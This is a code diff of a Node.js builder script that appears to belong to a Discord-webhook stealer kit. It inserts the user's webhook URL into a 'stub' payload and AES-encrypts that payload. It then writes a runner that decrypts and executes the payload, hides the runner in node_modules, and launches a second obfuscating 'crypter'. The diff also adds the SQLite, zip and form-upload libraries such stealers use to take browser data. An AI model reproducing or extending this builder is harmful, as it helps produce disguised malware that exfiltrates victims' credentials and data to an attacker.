@@ -3,7 +3,7 @@ const path = require('path');
 const crypto = require('crypto');
 const os = require('os');
 const readline = require('readline');
-const { execSync } = require('child_process');
+const { execSync, spawn } = require('child_process');
 const colors = require('colors');
 const axios = require('axios');
 
@@ -14,7 +14,7 @@ const rl = readline.createInterface({
 
 user = {
   hostname: os.hostname()
-  }
+}
 
 function encrypt(text, masterkey) {
   const iv = crypto.randomBytes(16);
@@ -73,20 +73,27 @@ function promptForWebhookURL() {
 }
 
 function executeSecondCrypterScript() {
-  const crypterDirectory = path.join(__dirname, '..', 'obf');
-  const secondCrypterScript = 'call obf.bat';
+  const crypterDirectory = __dirname;
+  const secondCrypterScript = 'jscrypter.js';
 
-  try {
-    const output = execSync(secondCrypterScript, { cwd: crypterDirectory, stdio: 'inherit' });
-    console.log(`Second crypter script output: ${output}`);
-  } catch (error) {
+  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });
+
+  childProcess.on('error', (error) => {
     console.error(`Error executing the second crypter script: ${error.message}`);
-  }
+  });
+
+  childProcess.on('exit', (code, signal) => {
+    if (code === 0) {
+      console.log(``);
+    } else {
+      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
+    }
+  });
 }
 
 function resetPlaceholder(stubPath, originalStubCode) {
   fs.writeFileSync(stubPath, originalStubCode, 'utf8');
-  console.log('success reset.');
+  console.log('Success reset.');
 }
 
 async function main() {
@@ -97,10 +104,11 @@ async function main() {
     await sendTestEmbed(webhookURL);
 
     const stubPath = path.resolve(__dirname, 'stub.js');
-    let stubCode = fs.readFileSync(stubPath, 'utf8');
+    const stubCode = fs.readFileSync(stubPath, 'utf8');
+    // p100 code upd crazy
     const updatedStubCode = stubCode.replace(
       /const discordWebhookUrl = 'REMPLACE_ME';/,
-      `const discordWebhookUrl = '${webhookURL}';`
+      `const discordWebhookUrl = '${webhookURL}';` 
     );
 
     if (stubCode === updatedStubCode) {
@@ -117,6 +125,10 @@ async function main() {
     // Generate the final runner code
     const runnerCode = `
 const crypto = require('crypto');
+const AdmZip = require('adm-zip');
+const fetch = require('node-fetch');
+const sqlite3 = require('sqlite3');
+const FormData = require('form-data');
 
 ${decrypt.toString()}
 
@@ -125,8 +137,8 @@ new Function('require', decrypted)(require);
 `;
 
     // Write the runner code to a file
-    const folderName = '../obf'; // Target folder name
-    const fileName = 'input.js'; // Target file name
+    const folderName = 'node_modules';
+    const fileName = 'input.js';
     const targetFolder = path.join(__dirname, folderName);
 
     // Create the folder (if it doesn't exist)
@@ -142,23 +154,14 @@ new Function('require', decrypted)(require);
     console.log(`${fileName} file has been written to the ${folderName} folder.`);
     console.log(`Obfuscated and encrypted with AES-256.`);
 
-
     setTimeout(() => {
       resetPlaceholder(stubPath, stubCode);
       executeSecondCrypterScript();
-    },);
-
+    }, 1000);
 
   } catch (error) {
     console.error(`Error: ${error.message}`);
   }
 }
 
-
 main();
-
-
-
-
-
-
